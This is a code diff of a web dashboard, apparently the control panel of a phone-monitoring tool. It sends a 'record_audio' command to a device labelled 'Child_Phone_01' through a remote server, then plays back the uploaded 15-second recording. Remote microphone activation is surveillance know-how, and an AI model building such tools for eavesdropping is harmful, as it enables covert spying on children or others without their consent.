@@ -8,27 +8,33 @@
     <style>
         :root { --accent: #00ff88; --bg: #0a0a0a; }
         body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; text-align: center; }
-        .header { padding: 20px; display: flex; align-items: center; gap: 15px; background: #111; }
+        .header { padding: 20px; display: flex; align-items: center; gap: 15px; background: #111; border-bottom: 1px solid #222; }
         .back-btn { color: white; text-decoration: none; font-size: 1.2rem; }
         
-        .mic-container { height: 60vh; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .mic-container { height: 55vh; display: flex; flex-direction: column; align-items: center; justify-content: center; }
         
-        /* Pulse Animation for Mic */
         .mic-circle {
-            width: 100px; height: 100px; background: rgba(0, 255, 136, 0.1);
+            width: 120px; height: 120px; background: rgba(0, 255, 136, 0.05);
             border-radius: 50%; display: flex; align-items: center; justify-content: center;
-            border: 2px solid var(--accent); position: relative;
+            border: 2px solid var(--accent); position: relative; transition: 0.3s;
         }
-        .mic-circle.active { animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(0, 255, 136, 0.4); } 70% { box-shadow: 0 0 0 30px rgba(0, 255, 136, 0); } 100% { box-shadow: 0 0 0 0 rgba(0, 255, 136, 0); } }
+        .mic-circle.active { animation: pulse 1.5s infinite; background: rgba(0, 255, 136, 0.2); }
+        
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(0, 255, 136, 0.4); }
+            70% { box-shadow: 0 0 0 30px rgba(0, 255, 136, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(0, 255, 136, 0); }
+        }
 
-        /* Visualizer Bars */
-        .visualizer { display: flex; gap: 5px; height: 50px; align-items: center; margin-top: 30px; }
-        .bar { width: 5px; height: 10px; background: var(--accent); border-radius: 10px; transition: 0.1s; }
+        .visualizer { display: flex; gap: 6px; height: 60px; align-items: center; margin-top: 40px; }
+        .bar { width: 6px; height: 15px; background: var(--accent); border-radius: 10px; transition: 0.15s; }
 
-        .controls { padding: 20px; display: flex; justify-content: center; gap: 20px; }
-        .btn { background: #222; border: 1px solid #333; color: white; padding: 15px 30px; border-radius: 30px; cursor: pointer; display: flex; align-items: center; gap: 10px; }
-        .btn.active { background: var(--accent); color: black; font-weight: bold; }
+        .controls { padding: 30px; display: flex; flex-direction: column; align-items: center; gap: 20px; }
+        .btn-group { display: flex; gap: 15px; }
+        .btn { background: #1a1a1a; border: 1px solid #333; color: white; padding: 15px 35px; border-radius: 30px; cursor: pointer; display: flex; align-items: center; gap: 10px; font-weight: 600; }
+        .btn.active { background: var(--accent); color: black; border-color: var(--accent); }
+        
+        #audioElement { display: none; } /* Chhupa hua audio player */
     </style>
 </head>
 <body>
@@ -43,45 +49,99 @@
         </div>
         
         <div class="visualizer" id="visualizer">
-            <div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div>
+            <div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div>
+            <div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div>
         </div>
-        <p id="statusText" style="color: #666; margin-top: 20px;">Microphone Standby</p>
+        <p id="statusText" style="color: #666; margin-top: 25px; font-size: 0.9rem;">Microphone Standby</p>
     </div>
 
     <div class="controls">
-        <button class="btn" id="startBtn" onclick="toggleMic()">
-            <i class="fa-solid fa-play"></i> Start Listening
-        </button>
-        <button class="btn" style="color: #ff4444;" onclick="stopMic()">
-            <i class="fa-solid fa-stop"></i> Stop
-        </button>
+        <div class="btn-group">
+            <button class="btn" id="startBtn" onclick="startRecording()">
+                <i class="fa-solid fa-play"></i> Start Audio
+            </button>
+            <button class="btn" id="stopBtn" style="color: #ff4444;" onclick="stopRecording()">
+                <i class="fa-solid fa-stop"></i> Stop
+            </button>
+        </div>
+        <audio id="audioElement" controls></audio>
     </div>
 
     <script>
+        const RENDER_URL = "https://child-v9no.onrender.com";
+        const DEVICE_ID = "Child_Phone_01";
         let isListening = false;
-        function toggleMic() {
-            isListening = true;
-            document.getElementById('micCircle').classList.add('active');
-            document.getElementById('startBtn').classList.add('active');
-            document.getElementById('statusText').innerText = "Streaming Audio Live...";
-            document.getElementById('statusText').style.color = "#00ff88";
-            // Visualizer animation logic
-            setInterval(() => {
-                if(isListening) {
-                    document.querySelectorAll('.bar').forEach(b => {
-                        b.style.height = Math.random() * 50 + "px";
-                    });
+        let vizInterval;
+
+        async function startRecording() {
+            try {
+                // 1. Phone ko command bhejo audio record karne ke liye
+                const res = await fetch(`${RENDER_URL}/api/send-command`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ device_id: DEVICE_ID, command: 'record_audio', duration: 15 }) // 15 sec ki recording
+                });
+
+                if(res.ok) {
+                    isListening = true;
+                    updateUI(true);
+                    startVisualizer();
+                    document.getElementById('statusText').innerText = "Command Sent! Waiting for audio upload...";
+                    
+                    // 2. 15 second baad audio file check karo
+                    setTimeout(checkAndPlayAudio, 17000);
                 }
-            }, 150);
+            } catch (err) {
+                alert("Server se connection fail ho gaya!");
+            }
         }
 
-        function stopMic() {
+        async function checkAndPlayAudio() {
+            if(!isListening) return;
+            
+            // Note: Ye endpoint aapke server.js ke logic par depend karta hai
+            // Agar aap audio as a file save kar rahe hain:
+            const audioUrl = `${RENDER_URL}/api/get-data/${DEVICE_ID}/audio`;
+            
+            const audioPlayer = document.getElementById('audioElement');
+            audioPlayer.src = audioUrl;
+            audioPlayer.play().catch(e => {
+                document.getElementById('statusText').innerText = "Audio file not ready yet. Try again.";
+            });
+            
+            document.getElementById('statusText').innerText = "Playing Latest Recording...";
+        }
+
+        function stopRecording() {
             isListening = false;
-            document.getElementById('micCircle').classList.remove('active');
-            document.getElementById('startBtn').classList.remove('active');
+            updateUI(false);
+            clearInterval(vizInterval);
+            const audioPlayer = document.getElementById('audioElement');
+            audioPlayer.pause();
             document.getElementById('statusText').innerText = "Microphone Standby";
-            document.getElementById('statusText').style.color = "#666";
-            document.querySelectorAll('.bar').forEach(b => b.style.height = "10px");
+        }
+
+        function updateUI(active) {
+            const circle = document.getElementById('micCircle');
+            const btn = document.getElementById('startBtn');
+            if(active) {
+                circle.classList.add('active');
+                btn.classList.add('active');
+            } else {
+                circle.classList.remove('active');
+                btn.classList.remove('active');
+                document.querySelectorAll('.bar').forEach(b => b.style.height = "15px");
+            }
+        }
+
+        function startVisualizer() {
+            vizInterval = setInterval(() => {
+                if(isListening) {
+                    document.querySelectorAll('.bar').forEach(b => {
+                        b.style.height = (Math.random() * 45 + 10) + "px";
+                    });
+                }
+            }, 100);
         }
     </script>
 </body>
